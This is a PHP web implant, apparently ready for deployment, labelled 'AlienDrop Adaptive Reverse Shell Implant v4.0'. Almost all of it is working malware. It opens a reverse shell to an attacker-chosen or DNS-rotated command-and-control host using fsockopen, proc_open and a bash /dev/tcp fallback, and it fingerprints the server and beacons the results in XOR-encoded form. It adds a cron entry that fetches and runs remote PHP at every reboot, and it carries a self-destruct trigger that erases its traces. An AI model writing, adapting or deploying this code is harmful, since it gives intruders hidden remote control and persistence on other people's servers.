<?php
// MINC - AlienDrop Adaptive Reverse Shell Implant v4.0 (Stealth • Self-Healing • Detonating)

set_time_limit(0);
ignore_user_abort(true);
ini_set('display_errors', '0');

// === DETONATION TRIGGER ===
$detonate_key = "0xcafebabe";
$trigger = $_GET['detonate'] ?? null;

if ($trigger === $detonate_key) {
    foreach ($GLOBALS as $k => $v) {
        if (!in_array($k, ['_GET', '_POST', '_SERVER', '_FILES'])) {
            $GLOBALS[$k] = null;
            unset($GLOBALS[$k]);
        }
    }
    if (function_exists('session_destroy')) @session_destroy();
    if (function_exists('openssl_random_pseudo_bytes')) {
        $junk = openssl_random_pseudo_bytes(4096);
    } else {
        $junk = str_repeat('X', 4096);
    }
    while (ob_get_level()) @ob_end_clean();
    @unlink("/tmp/.alienloop");
    @unlink("/tmp/.alien.sh");
    @unlink(__FILE__);
    exit;
}

// === CONFIG + C2 SETUP ===
$default_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
$default_port = 5775;
$retries = intval($_GET['retry'] ?? 0);
$beacon = isset($_GET['report']) && $_GET['report'] === 'true';
$persist = isset($_GET['persist']) && $_GET['persist'] === 'true';
$rotated = isset($_GET['rotated']) && $_GET['rotated'] === 'true';
$recon_id = substr(md5(php_uname() . gethostname()), 0, 12);
$uuid = substr(hash('sha1', $recon_id . time()), 0, 16);

// === C2 IP Resolver ===
function resolve_rotated_ip() {
    $domain = "cdn.alien-c2.net";
    $ips = @dns_get_record($domain, DNS_A);
    if ($ips && count($ips) > 0) {
        shuffle($ips);
        return $ips[0]['ip'] ?? $_SERVER['REMOTE_ADDR'];
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = $_GET['host'] ?? getenv('SHELL_C2') ?? ($rotated ? resolve_rotated_ip() : $default_ip);
$port = $_GET['port'] ?? getenv('SHELL_PORT') ?? $default_port;

// === Best Shell Path
$shells = ['/bin/bash', '/bin/sh', '/usr/bin/bash', '/usr/local/bin/bash'];
$shell = null;
foreach ($shells as $s) {
    if (file_exists($s)) { $shell = $s; break; }
}

// === XOR Beacon Encoder
function xor_encode($data, $key = "alien") {
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return base64_encode($out);
}

// === Beacon POST to C2 Tracker
function send_beacon($data) {
    $json = xor_encode(json_encode($data));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://{$_SERVER['HTTP_HOST']}/track.php?bc=1");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "data=$json");
    curl_setopt($ch, CURLOPT_TIMEOUT, 4);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// === Fingerprint Data
$fingerprint = [
    "id" => $recon_id,
    "uuid" => $uuid,
    "host" => gethostname(),
    "ip" => $ip,
    "port" => $port,
    "php" => phpversion(),
    "os" => php_uname(),
    "user" => @get_current_user(),
    "shell" => $shell,
    "ts" => time(),
    "rand" => rand(1000, 9999)
];

// === Reverse Shell Connection Logic
function connect_shell($ip, $port, $shell, $beacon, $uuid, $fingerprint) {
    $disabled = explode(',', ini_get('disable_functions') ?? '');
    $method = "none";

    if (!in_array('fsockopen', $disabled)) {
        $sock = @fsockopen($ip, $port);
        if ($sock) {
            $method = "fsockopen";
            fwrite($sock, "[AlienDrop:$uuid] Connected via fsockopen\n");
            while (!feof($sock)) {
                $cmd = trim(fread($sock, 2048));
                if (!$cmd) continue;
                $output = shell_exec($cmd);
                fwrite($sock, $output ?: "no output\n");
            }
            fclose($sock);
            if ($beacon) send_beacon(array_merge($fingerprint, ["method" => $method]));
            exit;
        }
    }

    if (!in_array('proc_open', $disabled) && function_exists('proc_open')) {
        $pipes = [];
        $dspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $proc = @proc_open($shell, $dspec, $pipes);
        $sock = @stream_socket_client("tcp://$ip:$port");
        if (is_resource($proc) && $sock) {
            $method = "proc_open";
            fwrite($sock, "[AlienDrop:$uuid] Connected via proc_open\n");
            while (!feof($sock)) {
                fwrite($pipes[0], fread($sock, 2048));
                fwrite($sock, fread($pipes[1], 2048));
            }
            fclose($sock);
            proc_close($proc);
            if ($beacon) send_beacon(array_merge($fingerprint, ["method" => $method]));
            exit;
        }
    }

    if (!in_array('system', $disabled) && $shell) {
        $method = "system_fallback";
        @system("$shell -i >& /dev/tcp/$ip/$port 0>&1");
    }

    if ($beacon) send_beacon(array_merge($fingerprint, ["method" => $method]));
}

// === Optional Reconnect Loop
$attempts = 0;
$max = $retries > 0 ? $retries : 1;

do {
    connect_shell($ip, $port, $shell, $beacon, $uuid, $fingerprint);
    $attempts++;
    sleep(rand(4, 8));
} while ($attempts < $max);

// === Optional Persistence Drop
if ($persist && function_exists('file_put_contents')) {
    $drop = "/tmp/.alienloop";
    $cron = "@reboot php -r 'include(\"http://{$_SERVER['HTTP_HOST']}/modules/php_backconnect.php?host=$ip&port=$port&report=true\");'";
    file_put_contents($drop, $cron);
    @shell_exec("(crontab -l 2>/dev/null; echo \"$cron\") | crontab -");
}

exit;
?>

